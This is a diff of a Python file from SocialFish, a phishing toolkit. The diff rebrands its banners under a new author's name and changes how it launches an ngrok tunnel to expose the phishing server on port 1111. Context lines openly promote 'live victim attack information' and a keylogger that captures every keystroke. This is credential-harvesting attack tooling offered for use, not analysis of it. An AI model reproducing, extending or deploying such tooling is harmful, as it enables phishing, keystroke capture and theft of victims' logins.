@@ -31,13 +31,14 @@ if connected() == False: #If there no network
       /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|
       \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |
           \|
-                    {0}[{1}!{0}]{1} Network error. Verify your connection.\n
+                   MADE by DARSH
+                   
 '''.format(RED, DEFAULT))
      exit(0)
 
 def checkNgrok(): #Check if user already have Ngrok server, if False - downloading it.
     if path.isfile('Server/ngrok') == False:
-        print('[*] Downloading Ngrok...')
+        print('[*] Downloading Ngrok. SOON..')
         if 'Android' in str(check_output(('uname', '-a'))):
             filename = 'ngrok-stable-linux-arm.zip'
         else:
@@ -57,7 +58,7 @@ checkNgrok()
 def end(): #Message when SocialFish exit
     system('clear')
     print ('''
-                   S O C I A L{2}
+                   S O C I A L{2} DARSH
               |\    \ \ \ \ \ \ \      __           ___
               |  \    \ \ \ \ \ \ \   | O~-_    _-~~   ~~-_
               |   >----|-|-|-|-|-|-|--|  __/   /   {1}DON'T{2}   )
@@ -217,7 +218,7 @@ def runPEnv(): #menu where user select what they wanna use
       .    '   '....'               ..'.      ' .
          '  .                     .     '          '     '  {1}v3.0{2}
                '  .  .  .  .  . '.    .'              '  .
-                   '         '    '. '  {1}Updated_By--> AnonUD4Y_{2}
+                   '         '    '. '  {1}Updated_By--> DARSHKINGHOU
  _________________________________________________________________________________
           {0}[ NOW WITH LIVE VICTIM ATTACK INFORMATION ]
           {0}A KEYLOGGER WILL BE DEPLOYED FOR YOU, TO CAPTURE EVERY KEYSTROKE ]
@@ -316,7 +317,7 @@ def runServeo():
     print("\n")
 
 def runNgrok():
-    system('./Server/ngrok http 1111 > /dev/null &')
+    system('ngrok http 1111 > /dev/null &')
     while True:
         sleep(2)
         system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
